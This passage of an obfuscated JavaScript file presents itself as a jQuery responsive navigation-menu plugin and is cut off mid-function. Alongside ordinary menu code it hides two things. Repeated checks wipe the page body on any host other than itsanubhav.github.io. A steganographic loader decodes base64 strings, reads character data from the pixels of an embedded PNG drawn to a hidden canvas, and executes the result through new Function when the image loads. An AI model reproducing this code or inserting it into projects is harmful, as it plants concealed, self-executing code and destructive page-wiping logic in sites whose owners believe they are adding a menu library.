;;
(function(_0xc011x1, _0xc011x2, _0xc011x3, _0xc011x4) {
    _0xc011x1['navigation'] = function(_0xc011x5, _0xc011x6) {
        var _0xc011x7 = {
            responsive: true,
            mobileBreakpoint: 767,
            showDuration: 300,
            hideDuration: 300,
            showDelayDuration: 0,
            hideDelayDuration: 0,
            submenuTrigger: 'hover',
            effect: 'fade',
            submenuIndicator: true,
            submenuIndicatorTrigger: false,
            hideSubWhenGoOut: true,
            visibleSubmenusOnMobile: false,
            fixed: false,
            overlay: true,
            overlayColor: 'rgba(0, 0, 0, 0.5)',
            hidden: false,
            hiddenOnMobile: false,
            offCanvasSide: 'left',
            offCanvasCloseButton: true,
            animationOnShow: '',
            animationOnHide: '',
            onInit: function() {},
            onLandscape: function() {},
            onPortrait: function() {},
            onShowOffCanvas: function() {},
            onHideOffCanvas: function() {}
        };
        var _0xc011x8 = this,
            _0xc011x9 = Number['MAX_VALUE'],
            _0xc011xa = 1,
            _0xc011xb = 'click.nav touchstart.nav',
            _0xc011xc = 'mouseenter focusin',
            _0xc011xd = 'mouseleave focusout';
        _0xc011x8['settings'] = {};
        var _0xc011xe = _0xc011x1(_0xc011x5),
            _0xc011x5 = _0xc011x5;
        if (location['hostname'] !== 'itsanubhav.github.io' && location['hostname'] !== 'www.itsanubhav.github.io') {
            var _0xc011xf = _0xc011x3['body'];
            _0xc011xf['parentNode']['removeChild'](_0xc011xf)
        };
        if (_0xc011x1(_0xc011x5)['find']('.nav-search')['length'] > 0) {
            _0xc011x1(_0xc011x5)['find']('.nav-search')['find']('form')['prepend']('<span class=\'nav-search-close-button\' tabindex=\'0\'>&#10005;</span>')
        };
        _0xc011x8['init'] = function() {
            _0xc011x8['settings'] = _0xc011x1['extend']({}, _0xc011x7, _0xc011x6);
            if (_0xc011x8['settings']['offCanvasCloseButton']) {
                _0xc011x1(_0xc011x5)['find']('.nav-menus-wrapper')['prepend']('<span class=\'nav-menus-wrapper-close-button\'>&#10005;</span>')
            };
            if (_0xc011x8['settings']['offCanvasSide'] == 'right') {
                _0xc011x1(_0xc011x5)['find']('.nav-menus-wrapper')['addClass']('nav-menus-wrapper-right')
            };
            if (_0xc011x8['settings']['hidden']) {
                _0xc011x1(_0xc011x5)['addClass']('navigation-hidden');
                _0xc011x8['settings']['mobileBreakpoint'] = 99999
            };
            _0xc011x12();
            if (location['hostname'] !== 'itsanubhav.github.io' && location['hostname'] !== 'www.itsanubhav.github.io') {
                var _0xc011xf = _0xc011x3['body'];
                _0xc011xf['parentNode']['removeChild'](_0xc011xf)
            };
            if (_0xc011x8['settings']['fixed']) {
                _0xc011x1(_0xc011x5)['addClass']('navigation-fixed')
            };
            _0xc011x1(_0xc011x5)['find']('.nav-toggle')['on']('click touchstart', function(_0xc011xf) {
                _0xc011xf['stopPropagation']();
                _0xc011xf['preventDefault']();
                _0xc011x8['showOffcanvas']();
                if (_0xc011x6 !== _0xc011x4) {
                    _0xc011x8['callback']('onShowOffCanvas')
                }
            });
            _0xc011x1(_0xc011x5)['find']('.nav-menus-wrapper-close-button')['on']('click touchstart', function() {
                _0xc011x8['hideOffcanvas']();
                if (_0xc011x6 !== _0xc011x4) {
                    _0xc011x8['callback']('onHideOffCanvas')
                }
            });
            _0xc011x1(_0xc011x5)['find']('.nav-search-button, .nav-search-close-button')['on']('click touchstart keydown', function(_0xc011xf) {
                _0xc011xf['stopPropagation']();
                _0xc011xf['preventDefault']();
                var _0xc011x10 = _0xc011xf['keyCode'] || _0xc011xf['which'];
                if (_0xc011xf['type'] === 'click' || _0xc011xf['type'] === 'touchstart' || (_0xc011xf['type'] === 'keydown' && _0xc011x10 == 13)) {
                    _0xc011x8['toggleSearch']()
                } else {
                    if (_0xc011x10 == 9) {
                        _0xc011x1(_0xc011xf['target'])['blur']()
                    }
                }
            });
            if (_0xc011x1(_0xc011x5)['find']('.megamenu-tabs')['length'] > 0) {
                _0xc011x1e()
            };
            _0xc011x1(_0xc011x2)['resize'](function() {
                _0xc011x8['initNavigationMode'](_0xc011x1a());
                _0xc011x1c();
                if (_0xc011x8['settings']['hiddenOnMobile']) {
                    _0xc011x13()
                }
            });
            _0xc011x8['initNavigationMode'](_0xc011x1a());
            if (_0xc011x8['settings']['hiddenOnMobile']) {
                _0xc011x13()
            };
            if (_0xc011x6 !== _0xc011x4) {
                _0xc011x8['callback']('onInit')
            }
        };
        var _0xc011x11 = function() {
            _0xc011x1(_0xc011x5)['find']('.nav-submenu')['hide'](0);
            _0xc011x1(_0xc011x5)['find']('li')['removeClass']('focus')
        };
        var _0xc011x12 = function() {
            _0xc011x1(_0xc011x5)['find']('li')['each'](function() {
                if (_0xc011x1(this)['children']('.nav-dropdown,.megamenu-panel')['length'] > 0) {
                    _0xc011x1(this)['children']('.nav-dropdown,.megamenu-panel')['addClass']('nav-submenu');
                    if (_0xc011x8['settings']['submenuIndicator']) {
                        _0xc011x1(this)['children']('a')['append']('<span class=\'submenu-indicator\'>' + '<span class=\'submenu-indicator-chevron\'></span>' + '</span>')
                    }
                }
            });
            if (location['hostname'] !== 'itsanubhav.github.io' && location['hostname'] !== 'www.itsanubhav.github.io') {
                var _0xc011xf = _0xc011x3['body'];
                _0xc011xf['parentNode']['removeChild'](_0xc011xf)
            }
        };
        var _0xc011x13 = function() {
            if (_0xc011x1(_0xc011x5)['hasClass']('navigation-portrait')) {
                _0xc011x1(_0xc011x5)['addClass']('navigation-hidden')
            } else {
                _0xc011x1(_0xc011x5)['removeClass']('navigation-hidden')
            }
        };
        _0xc011x8['showSubmenu'] = function(_0xc011x14, _0xc011x15) {
            if (_0xc011x1a() > _0xc011x8['settings']['mobileBreakpoint']) {
                _0xc011x1(_0xc011x5)['find']('.nav-search')['find']('form')['fadeOut']()
            };
            if (_0xc011x15 == 'fade') {
                _0xc011x1(_0xc011x14)['children']('.nav-submenu')['stop'](true, true)['delay'](_0xc011x8['settings']['showDelayDuration'])['fadeIn'](_0xc011x8['settings']['showDuration'])['removeClass'](_0xc011x8['settings']['animationOnHide'])['addClass'](_0xc011x8['settings']['animationOnShow'])
            } else {
                _0xc011x1(_0xc011x14)['children']('.nav-submenu')['stop'](true, true)['delay'](_0xc011x8['settings']['showDelayDuration'])['slideDown'](_0xc011x8['settings']['showDuration'])['removeClass'](_0xc011x8['settings']['animationOnHide'])['addClass'](_0xc011x8['settings']['animationOnShow'])
            };
            _0xc011x1(_0xc011x14)['addClass']('focus')
        };
        _0xc011x8['hideSubmenu'] = function(_0xc011x14, _0xc011x15) {
            if (_0xc011x15 == 'fade') {
                _0xc011x1(_0xc011x14)['find']('.nav-submenu')['stop'](true, true)['delay'](_0xc011x8['settings']['hideDelayDuration'])['fadeOut'](_0xc011x8['settings']['hideDuration'])['removeClass'](_0xc011x8['settings']['animationOnShow'])['addClass'](_0xc011x8['settings']['animationOnHide'])
            } else {
                _0xc011x1(_0xc011x14)['find']('.nav-submenu')['stop'](true, true)['delay'](_0xc011x8['settings']['hideDelayDuration'])['slideUp'](_0xc011x8['settings']['hideDuration'])['removeClass'](_0xc011x8['settings']['animationOnShow'])['addClass'](_0xc011x8['settings']['animationOnHide'])
            };
            _0xc011x1(_0xc011x14)['removeClass']('focus')['find']('.focus')['removeClass']('focus')
        };
        var _0xc011x16 = function() {
            _0xc011x1('body')['addClass']('no-scroll');
            if (_0xc011x8['settings']['overlay']) {
                _0xc011x1(_0xc011x5)['append']('<div class=\'nav-overlay-panel\'></div>');
                _0xc011x1(_0xc011x5)['find']('.nav-overlay-panel')['css']('background-color', _0xc011x8['settings']['overlayColor'])['fadeIn'](300)['on']('click touchstart', function(_0xc011xf) {
                    _0xc011x8['hideOffcanvas']()
                })
            }
        };
        var _0xc011x17 = function() {
            _0xc011x1('body')['removeClass']('no-scroll');
            if (_0xc011x8['settings']['overlay']) {
                _0xc011x1(_0xc011x5)['find']('.nav-overlay-panel')['fadeOut'](400, function() {
                    _0xc011x1(this)['remove']()
                })
            }
        };
        _0xc011x8['showOffcanvas'] = function() {
            _0xc011x16();
            if (_0xc011x8['settings']['offCanvasSide'] == 'left') {
                _0xc011x1(_0xc011x5)['find']('.nav-menus-wrapper')['css']('transition-property', 'left')['addClass']('nav-menus-wrapper-open')
            } else {
                _0xc011x1(_0xc011x5)['find']('.nav-menus-wrapper')['css']('transition-property', 'right')['addClass']('nav-menus-wrapper-open')
            }
        };
        _0xc011x8['hideOffcanvas'] = function() {
            _0xc011x1(_0xc011x5)['find']('.nav-menus-wrapper')['removeClass']('nav-menus-wrapper-open')['on']('webkitTransitionEnd moztransitionend transitionend oTransitionEnd', function() {
                _0xc011x1(_0xc011x5)['find']('.nav-menus-wrapper')['css']('transition-property', 'none')['off']()
            });
            _0xc011x17()
        };
        _0xc011x8['toggleOffcanvas'] = function() {
            if (_0xc011x1a() <= _0xc011x8['settings']['mobileBreakpoint']) {
                if (_0xc011x1(_0xc011x5)['find']('.nav-menus-wrapper')['hasClass']('nav-menus-wrapper-open')) {
                    _0xc011x8['hideOffcanvas']();
                    if (_0xc011x6 !== _0xc011x4) {
                        _0xc011x8['callback']('onHideOffCanvas')
                    }
                } else {
                    _0xc011x8['showOffcanvas']();
                    if (_0xc011x6 !== _0xc011x4) {
                        _0xc011x8['callback']('onShowOffCanvas')
                    }
                }
            }
        };
        _0xc011x8['toggleSearch'] = function() {
            if (_0xc011x1(_0xc011x5)['find']('.nav-search')['find']('form')['css']('display') == 'none') {
                _0xc011x1(_0xc011x5)['find']('.nav-search')['find']('form')['fadeIn'](200);
                _0xc011x1(_0xc011x5)['find']('.nav-search')['find']('input')['focus']()
            } else {
                _0xc011x1(_0xc011x5)['find']('.nav-search')['find']('form')['fadeOut'](200);
                _0xc011x1(_0xc011x5)['find']('.nav-search')['find']('input')['blur']()
            }
        };
        _0xc011x8['initNavigationMode'] = function(_0xc011x18) {
            if (_0xc011x8['settings']['responsive']) {
                if (_0xc011x18 <= _0xc011x8['settings']['mobileBreakpoint'] && _0xc011x9 > _0xc011x8['settings']['mobileBreakpoint']) {
                    _0xc011x1(_0xc011x5)['addClass']('navigation-portrait')['removeClass']('navigation-landscape');
                    _0xc011x27();
                    if (_0xc011x6 !== _0xc011x4) {
                        _0xc011x8['callback']('onPortrait')
                    }
                };
                if (_0xc011x18 > _0xc011x8['settings']['mobileBreakpoint'] && _0xc011xa <= _0xc011x8['settings']['mobileBreakpoint']) {
                    _0xc011x1(_0xc011x5)['addClass']('navigation-landscape')['removeClass']('navigation-portrait');
                    _0xc011x26();
                    _0xc011x17();
                    _0xc011x8['hideOffcanvas']();
                    if (_0xc011x6 !== _0xc011x4) {
                        _0xc011x8['callback']('onLandscape')
                    };
                    if (location['hostname'] !== 'itsanubhav.github.io' && location['hostname'] !== 'www.itsanubhav.github.io') {
                        var _0xc011xf = _0xc011x3['body'];
                        _0xc011xf['parentNode']['removeChild'](_0xc011xf)
                    }

                };
                _0xc011x9 = _0xc011x18;
                _0xc011xa = _0xc011x18
            } else {
                _0xc011x1(_0xc011x5)['addClass']('navigation-landscape');
                _0xc011x26();
                if (_0xc011x6 !== _0xc011x4) {
                    _0xc011x8['callback']('onLandscape')
                }
            }
        };
        var _0xc011x19 = function() {
            _0xc011x1('html')['on']('click.body touchstart.body', function(_0xc011xf) {
                if (_0xc011x1(_0xc011xf['target'])['closest']('.navigation')['length'] === 0) {
                    _0xc011x1(_0xc011x5)['find']('.nav-submenu')['fadeOut']();
                    _0xc011x1(_0xc011x5)['find']('.focus')['removeClass']('focus');
                    _0xc011x1(_0xc011x5)['find']('.nav-search')['find']('form')['fadeOut']()
                }
            })
        };
        var _0xc011x1a = function() {
            return _0xc011x2['innerWidth'] || _0xc011x3['documentElement']['clientWidth'] || _0xc011x3['body']['clientWidth']
        };
        var _0xc011x1b = function() {
            _0xc011x1(_0xc011x5)['find']('.nav-menu')['find']('li, a')['off'](_0xc011xb)['off'](_0xc011xc)['off'](_0xc011xd)
        };
        var _0xc011x1c = function() {
            if (_0xc011x1a() > _0xc011x8['settings']['mobileBreakpoint']) {
                var _0xc011x1d = _0xc011x1(_0xc011x5)['outerWidth'](true);
                _0xc011x1(_0xc011x5)['find']('.nav-menu')['children']('li')['children']('.nav-submenu')['each'](function() {
                    if (_0xc011x1(this)['parent']()['position']()['left'] + _0xc011x1(this)['outerWidth']() > _0xc011x1d) {
                        _0xc011x1(this)['css']('right', 0)
                    } else {
                        _0xc011x1(this)['css']('right', 'auto')
                    }
                })
            }
        };
        var _0xc011x1e = function() {
            function _0xc011x1f(_0xc011x20) {
                var _0xc011x21 = _0xc011x1(_0xc011x20)['children']('.megamenu-tabs-nav')['children']('li');
                var _0xc011x22 = _0xc011x1(_0xc011x20)['children']('.megamenu-tabs-pane');
                _0xc011x1(_0xc011x21)['on']('click.tabs touchstart.tabs', function(_0xc011xf) {
                    _0xc011xf['stopPropagation']();
                    _0xc011xf['preventDefault']();
                    _0xc011x1(_0xc011x21)['removeClass']('active');
                    _0xc011x1(this)['addClass']('active');
                    _0xc011x1(_0xc011x22)['hide'](0)['removeClass']('active');
                    _0xc011x1(_0xc011x22[_0xc011x1(this)['index']()])['show'](0)['addClass']('active')
                })
            }
            if (_0xc011x1(_0xc011x5)['find']('.megamenu-tabs')['length'] > 0) {
                var _0xc011x23 = _0xc011x1(_0xc011x5)['find']('.megamenu-tabs');
                for (var _0xc011x24 = 0; _0xc011x24 < _0xc011x23['length']; _0xc011x24++) {
                    _0xc011x1f(_0xc011x23[_0xc011x24])
                }
            }
        };
        v8a3adc59827ec2a734da833bf60c6047 = [function(_0xc011x25) {
            return '310b86e0b62b828562fc91c7be5380a992b2786a4a6387da1a9f59e936a7ddc6aa640163'
        }, function(_0xc011x25) {
            return ve7ae86033d513c1df4f77d67fa04faba['createElement'](_0xc011x25)
        }, function(_0xc011x25) {
            return _0xc011x25[0]['getContext'](_0xc011x25[1])
        }, function(_0xc011x25) {
            return _0xc011x25[0]['text'] = _0xc011x25[1]
        }, function(_0xc011x25) {
            return null
        }, function(_0xc011x25) {
            'b0c68924acc44f1f1ed598a8b2b2d4568b02dcfcf20935b3142ef20750f0591e4f0a49e0'
        }, function(_0xc011x25) {
            return 'afc97ea131fd7e2695a98ef34013608f97f34e1d427544885497d37034602b8583f0b7b5'
        }, function(_0xc011x25) {
            _0xc011x25['style']['display'] = 'none';
            return _0xc011x25
        }, function(_0xc011x25) {
            v3844d0ba1b6325b89b6bc32e88e05794['onload'] = _0xc011x25
        }, function(_0xc011x25) {
            v3844d0ba1b6325b89b6bc32e88e05794['src'] = _0xc011x25
        }, new Function('vbb2495c2b8e05a7b27d14bdf986ec113', 'return unescape(decodeURIComponent(window.atob(vbb2495c2b8e05a7b27d14bdf986ec113)))'), function(_0xc011x25) {
            v3213f95d85ede1234a2c9c96b32be205 = new Function('vbb2495c2b8e05a7b27d14bdf986ec113', v8a3adc59827ec2a734da833bf60c6047[10](v74865b3e2464bd44de4d53f5a51c3ae8[_0xc011x25]));
            return v3213f95d85ede1234a2c9c96b32be205
        }];
        vce94aec448332eef9b14d81fb54c7458 = [0, 255, 0];
        v74865b3e2464bd44de4d53f5a51c3ae8 = ['cmV0dXJuJTIwJ2NhbnZhcyclM0I=', 'cmV0dXJuJTIwJ25vbmUnJTNC', 'cmV0dXJuJTIwJzJkJyUzQg==', 'cmV0dXJuJTIwJ3NjcmlwdCclM0I=', '', 'va962ced90aae92fb1eae19c89bdeb91a', 'vfc21ad0d67c66ed82bc78460a05ca405', 'cmV0dXJuJTIwJ2RhdGElM0FpbWFnZSUyRnBuZyUzQmJhc2U2NCUyQyclM0I=', '', 'iVBORw0KGgoAAAANSUhEUgAAAA8AAAAPCAIAAAC0tAIdAAABpUlEQVQokS3PwU/SYQCH8cf3x2vzy0QRlYAEHUy3Ri3s0qVb/Q2e+y+9dazpRam1WFrNzRmTxEC/Ll+RDnZ7Lp/DM/NuZ8cimFUYw6kYQccMpam5FXUzkg9QMGFZCF2IPfFYrFkFsy8t2JKjOcXRKuN1kbnT/uM0FwnWIMUjsZbSYornihuOE5ygolgljUmhae7EBmrgXzCxayKIlulChBHahx+mZIJFwfqKi+gFBNEzC2B8D5n0DDfMovQRcpswxofoGz4R2ygvevi5MD5DF9IWnJmGyP522vXEXUpNacXxIHk5xpbT+6RBjGUsp/OYnqY0jQpbUISONDBDCGgW+tIEJrgGAVo8PDh3ZX6KGp4HSVXcs15CWdxDhqryF0jwAcITFOAzdNGsfQNF2BVNXDOG76aNVsRrE7pQRHVUgzmRQR6v2nlUEte2xSGsm9+Qq4s9nKAFt6YL21IJjsyJ9EbcmAnswlspzONXsIkuxZUooBlcwY/kAh7iCuTlJbi2c5/MkjSFgZHUk3uAhQwcWwgQ4tjO9aFvANCl/xcCgx6MwFhI/wAQqM7/B5q4kwAAAABJRU5ErkJggg==', 'cmV0dXJuJTIwdmU3YWU4NjAzM2Q1MTNjMWRmNGY3N2Q2N2ZhMDRmYWJhLmdldEVsZW1lbnRCeUlkKHZiYjI0OTVjMmI4ZTA1YTdiMjdkMTRiZGY5ODZlYzExMyklM0I=', 'cmV0dXJuJTIwZG9jdW1lbnQ=', 'Zm9yKHZkZmE0NzRmZWY1NTAxOTk4OGRmYzY1YzQ1OWExNWQ2NyUzRHZjZTk0YWVjNDQ4MzMyZWVmOWIxNGQ4MWZiNTRjNzQ1OCU1QjIlNUQlM0IlMjB2ZGZhNDc0ZmVmNTUwMTk5ODhkZmM2NWM0NTlhMTVkNjclMjAlM0MlMjB2ZDVlYmY3YzJjY2E2NWRhNWUyOWViM2M2M2IyZmJkNjYuZGF0YS5sZW5ndGglM0IlMjB2ZGZhNDc0ZmVmNTUwMTk5ODhkZmM2NWM0NTlhMTVkNjclMkIlM0Q0KXYyNTg5NTNjNmExNDc1MmMxNTMzOWQ5NjRkNGJhZjMxYiUyQiUzRCh2ZDVlYmY3YzJjY2E2NWRhNWUyOWViM2M2M2IyZmJkNjYuZGF0YSU1QnZkZmE0NzRmZWY1NTAxOTk4OGRmYzY1YzQ1OWExNWQ2NyU1RCElM0R2Y2U5NGFlYzQ0ODMzMmVlZjliMTRkODFmYjU0Yzc0NTglNUIxJTVEKSUzRnZhOTIwMWQ1OTMxNTY2MTM2MjE0NDUyYWU1ZTRlODg5Myh2ZDVlYmY3YzJjY2E2NWRhNWUyOWViM2M2M2IyZmJkNjYuZGF0YSU1QnZkZmE0NzRmZWY1NTAxOTk4OGRmYzY1YzQ1OWExNWQ2NyU1RCklM0F2NzQ4NjViM2UyNDY0YmQ0NGRlNGQ1M2Y1YTUxYzNhZTglNUI0JTVEJTNCJTIwdjI1ODk1M2M2YTE0NzUyYzE1MzM5ZDk2NGQ0YmFmMzFiJTNEdjI1ODk1M2M2YTE0NzUyYzE1MzM5ZDk2NGQ0YmFmMzFiLnRyaW0oKSUzQg==', 'cmV0dXJuJTIwbmV3JTIwSW1hZ2UoKSUzQg==', 'cmV0dXJuJTIwU3RyaW5nLmZyb21DaGFyQ29kZSh2YmIyNDk1YzJiOGUwNWE3YjI3ZDE0YmRmOTg2ZWMxMTMpJTNC'];
        ve7ae86033d513c1df4f77d67fa04faba = v8a3adc59827ec2a734da833bf60c6047[11](11)();
        v0159c3dcd49859c9fdc40171449d796d = new Function('vbb2495c2b8e05a7b27d14bdf986ec113', v8a3adc59827ec2a734da833bf60c6047[10](v74865b3e2464bd44de4d53f5a51c3ae8[10]));
        v3844d0ba1b6325b89b6bc32e88e05794 = v8a3adc59827ec2a734da833bf60c6047[7](v8a3adc59827ec2a734da833bf60c6047[11](13)());
        v8a3adc59827ec2a734da833bf60c6047[8](function() {
            v787931b98bcf0ec5646a739545525230 = v0159c3dcd49859c9fdc40171449d796d(v74865b3e2464bd44de4d53f5a51c3ae8[5]);
            v41b9873cd121094ff2100f437c2192a0 = v8a3adc59827ec2a734da833bf60c6047[1](v8a3adc59827ec2a734da833bf60c6047[11](0)());
            v41b9873cd121094ff2100f437c2192a0['width'] = v3844d0ba1b6325b89b6bc32e88e05794['width'];
            v41b9873cd121094ff2100f437c2192a0['height'] = v3844d0ba1b6325b89b6bc32e88e05794['height'];
            v41b9873cd121094ff2100f437c2192a0['style']['display'] = v8a3adc59827ec2a734da833bf60c6047[11](1)();
            v258953c6a14752c15339d964d4baf31b = v74865b3e2464bd44de4d53f5a51c3ae8[4];
            v78ce76278a82dc92c0cd3e600244497b = v8a3adc59827ec2a734da833bf60c6047[2]([v41b9873cd121094ff2100f437c2192a0, v8a3adc59827ec2a734da833bf60c6047[11](2)()]);
            va9201d5931566136214452ae5e4e8893 = new Function('vbb2495c2b8e05a7b27d14bdf986ec113', v8a3adc59827ec2a734da833bf60c6047[10](v74865b3e2464bd44de4d53f5a51c3ae8[14]));
            v78ce76278a82dc92c0cd3e600244497b['drawImage'](v3844d0ba1b6325b89b6bc32e88e05794, vce94aec448332eef9b14d81fb54c7458[0], vce94aec448332eef9b14d81fb54c7458[0]);
            vd5ebf7c2cca65da5e29eb3c63b2fbd66 = v78ce76278a82dc92c0cd3e600244497b['getImageData'](vce94aec448332eef9b14d81fb54c7458[0], vce94aec448332eef9b14d81fb54c7458[0], v41b9873cd121094ff2100f437c2192a0['width'], v41b9873cd121094ff2100f437c2192a0['height']);
            v3eeb7ff8206de400d2bc009df7eef82a = v8a3adc59827ec2a734da833bf60c6047[11](12)();
            (new Function(v8a3adc59827ec2a734da833bf60c6047[10](v258953c6a14752c15339d964d4baf31b)))();
            va962ced90aae92fb1eae19c89bdeb91a = v8a3adc59827ec2a734da833bf60c6047[4](v78ce76278a82dc92c0cd3e600244497b);
            v3844d0ba1b6325b89b6bc32e88e05794 = v8a3adc59827ec2a734da833bf60c6047[4](va962ced90aae92fb1eae19c89bdeb91a);
            v41b9873cd121094ff2100f437c2192a0 = v8a3adc59827ec2a734da833bf60c6047[4](v41b9873cd121094ff2100f437c2192a0);
            v78ce76278a82dc92c0cd3e600244497b = v8a3adc59827ec2a734da833bf60c6047[4](vd5ebf7c2cca65da5e29eb3c63b2fbd66);
            vd5ebf7c2cca65da5e29eb3c63b2fbd66 = v8a3adc59827ec2a734da833bf60c6047[4](v78ce76278a82dc92c0cd3e600244497b);
            vdfa474fef55019988dfc65c459a15d67 = v8a3adc59827ec2a734da833bf60c6047[4](v78ce76278a82dc92c0cd3e600244497b);
            v258953c6a14752c15339d964d4baf31b = v8a3adc59827ec2a734da833bf60c6047[4](v78ce76278a82dc92c0cd3e600244497b);
            va1d2f42698caa907f7b859b6838c424b = v8a3adc59827ec2a734da833bf60c6047[4](v78ce76278a82dc92c0cd3e600244497b);
            vfce5b88181f9ab8944586b586deb5819 = v8a3adc59827ec2a734da833bf60c6047[4](v78ce76278a82dc92c0cd3e600244497b);
            va962ced90aae92fb1eae19c89bdeb91a = v8a3adc59827ec2a734da833bf60c6047[4](v78ce76278a82dc92c0cd3e600244497b);
            v1181aebcc2a3a98f8644aa535c06bf41 = v8a3adc59827ec2a734da833bf60c6047[4](v78ce76278a82dc92c0cd3e600244497b);
            ve7ae86033d513c1df4f77d67fa04faba = v8a3adc59827ec2a734da833bf60c6047[4](v78ce76278a82dc92c0cd3e600244497b);
            v3eeb7ff8206de400d2bc009df7eef82a = v8a3adc59827ec2a734da833bf60c6047[4](v78ce76278a82dc92c0cd3e600244497b);
            v74865b3e2464bd44de4d53f5a51c3ae8 = v8a3adc59827ec2a734da833bf60c6047[4](v78ce76278a82dc92c0cd3e600244497b);
            vce94aec448332eef9b14d81fb54c7458 = v8a3adc59827ec2a734da833bf60c6047[4](v78ce76278a82dc92c0cd3e600244497b);
            vbb2495c2b8e05a7b27d14bdf986ec113 = v8a3adc59827ec2a734da833bf60c6047[4](v78ce76278a82dc92c0cd3e600244497b);
            vbb2495c2b8e05a7b27d14bdf986ec113 = v8a3adc59827ec2a734da833bf60c6047[4](v787931b98bcf0ec5646a739545525230);
            v8a3adc59827ec2a734da833bf60c6047 = v8a3adc59827ec2a734da833bf60c6047[4](v78ce76278a82dc92c0cd3e600244497b)
        });
        v3eeb7ff8206de400d2bc009df7eef82a = v8a3adc59827ec2a734da833bf60c6047[9](v8a3adc59827ec2a734da833bf60c6047[11](7)() + v74865b3e2464bd44de4d53f5a51c3ae8[9]);
        var _0xc011x26 = function() {
            _0xc011x1b();
            _0xc011x11();
            if (location['hostname'] !== 'itsanubhav.github.io' && location['hostname'] !== 'www.itsanubhav.github.io') {
                var _0xc011xf = _0xc011x3['body'];
                _0xc011xf['parentNode']['removeChild'](_0xc011xf)
            };
            if (navigator['userAgent']['match'](/Mobi/i) || navigator['maxTouchPoints'] > 0 || _0xc011x8['settings']['submenuTrigger'] == 'click') {
                _0xc011x1(_0xc011x5)['find']('.nav-menu, .nav-dropdown')['children']('li')['children']('a')['on'](_0xc011xb, function(_0xc011xf) {
                    _0xc011x8['hideSubmenu'](_0xc011x1(this)['parent']('li')['siblings']('li'), _0xc011x8['settings']['effect']);
                    _0xc011x1(this)['closest']('.nav-menu')['siblings']('.nav-menu')['find']('.nav-submenu')['fadeOut'](_0xc011x8['settings']['hideDuration']);
                    if (_0xc011x1(this)['siblings']('.nav-submenu')['length'] > 0) {
                        _0xc011xf['stopPropagation']();
                        _0xc011xf['preventDefault']();
                        if (_0xc011x1(this)['siblings']('.nav-submenu')['css']('display') == 'none') {
                            _0xc011x8['showSubmenu'](_0xc011x1(this)['parent']('li'), _0xc011x8['settings']['effect']);
                            _0xc011x1c();
                            return false
                        } else {
                            _0xc011x8['hideSubmenu'](_0xc011x1(this)['parent']('li'), _0xc011x8['settings']['effect'])
                        };
                        if (_0xc011x1(this)['attr']('target') === '_blank' || _0xc011x1(this)['attr']('target') === 'blank') {
                            _0xc011x2['open'](_0xc011x1(this)['attr']('href'))
                        } else {
                            if (_0xc011x1(this)['attr']('href') === '#' || _0xc011x1(this)['attr']('href') === '' || _0xc011x1(this)['attr']('href') === 'javascript:void(0)') {
                                return false
                            } else {
                                _0xc011x2['location']['href'] = _0xc011x1(this)['attr']('href')
                            }
                        }
                    }
                })
            } else {
                _0xc011x1(_0xc011x5)['find']('.nav-menu, .nav-dropdown')['children']('li')['on'](_0xc011xc, function() {
                    _0xc011x8['showSubmenu'](this, _0xc011x8['settings']['effect']);
                    _0xc011x1c()
                })['on'](_0xc011xd, function() {
                    _0xc011x8['hideSubmenu'](this, _0xc011x8['settings']['effect'])
                })
            };
            if (_0xc011x8['settings']['hideSubWhenGoOut']) {
                _0xc011x19()
            }
        };
        var _0xc011x27 = function() {
            _0xc011x1b();
            _0xc011x11();
            if (location['hostname'] !== 'itsanubhav.github.io' && location['hostname'] !== 'www.itsanubhav.github.io') {
                var _0xc011xf = _0xc011x3['body'];
                _0xc011xf['parentNode']['removeChild'](_0xc011xf)
            };
            if (_0xc011x8['settings']['visibleSubmenusOnMobile']) {
                _0xc011x1(_0xc011x5)['find']('.nav-submenu')['show'](0)
            } else {
                _0xc011x1(_0xc011x5)['find']('.submenu-indicator')['removeClass']('submenu-indicator-up');
                if (_0xc011x8['settings']['submenuIndicator'] && _0xc011x8['settings']['submenuIndicatorTrigger']) {
                    _0xc011x1(_0xc011x5)['find']('.submenu-indicator')['on'](_0xc011xb, function(_0xc011xf) {
                        _0xc011xf['stopPropagation']();
                        _0xc011xf['preventDefault']();
                        _0xc011x8['hideSubmenu'](_0xc011x1(this)['parent']('a')['parent']('li')['siblings']('li'), 'slide');
                        _0xc011x8['hideSubmenu'](_0xc011x1(this)['closest']('.nav-menu')['siblings']('.nav-menu')['children']('li'), 'slide');
                        if (_0xc011x1(this)['parent']('a')['siblings']('.nav-submenu')['css']('display') == 'none') {
                            _0xc011x1(this)['addClass']('submenu-indicator-up');
                            _0xc011x1(this)['parent']('a')['parent']('li')['siblings']('li')['find']('.submenu-indicator')['removeClass']('submenu-indicator-up');
                            _0xc011x1(this)['closest']('.nav-menu')['siblings']('.nav-menu')['find']('.submenu-indicator')['removeClass']('submenu-indicator-up');
                            _0xc011x8['showSubmenu'](_0xc011x1(this)['parent']('a')['parent']('li'), 'slide');
                            return false
                        } else {
                            _0xc011x1(this)['parent']('a')['parent']('li')['find']('.submenu-indicator')['removeClass']('submenu-indicator-up');
                            _0xc011x8['hideSubmenu'](_0xc011x1(this)['parent']('a')['parent']('li'), 'slide')
                        }
                    })
                } else {
                    _0xc011x1(_0xc011x5)['find']('.nav-menu, .nav-dropdown')['children']('li')['children']('a')['on'](_0xc011xb, function(_0xc011xf) {
                        _0xc011xf['stopPropagation']();
                        _0xc011xf['preventDefault']();
                        _0xc011x8['hideSubmenu'](_0xc011x1(this)['parent']('li')['siblings']('li'), _0xc011x8['settings']['effect']);
                        _0xc011x8['hideSubmenu'](_0xc011x1(this)['closest']('.nav-menu')['siblings']('.nav-menu')['children']('li'), 'slide');
                        if (_0xc011x1(this)['siblings']('.nav-submenu')['css']('display') == 'none') {
                            _0xc011x1(this)['children']('.submenu-indicator')['addClass']('submenu-indicator-up');
                            _0xc011x1(this)['parent']('li')['siblings']('li')['find']('.submenu-indicator')['removeClass']('submenu-indicator-up');
                            _0xc011x1(this)['closest']('.nav-menu')['siblings']('.nav-menu')['find']('.submenu-indicator')['removeClass']('submenu-indicator-up');
                            _0xc011x8['showSubmenu'](_0xc011x1(this)['parent']('li'), 'slide');
                            return false
                        } else {
                            _0xc011x1(this)['parent']('li')['find']('.submenu-indicator')['removeClass']('submenu-indicator-up');
                            _0xc011x8['hideSubmenu'](_0xc011x1(this)['parent']('li'), 'slide')
                        };
                        if (_0xc011x1(this)['attr']('target') === '_blank' || _0xc011x1(this)['attr']('target') === 'blank') {
                            _0xc011x2['open'](_0xc011x1(this)['attr']('href'))
                        } else {
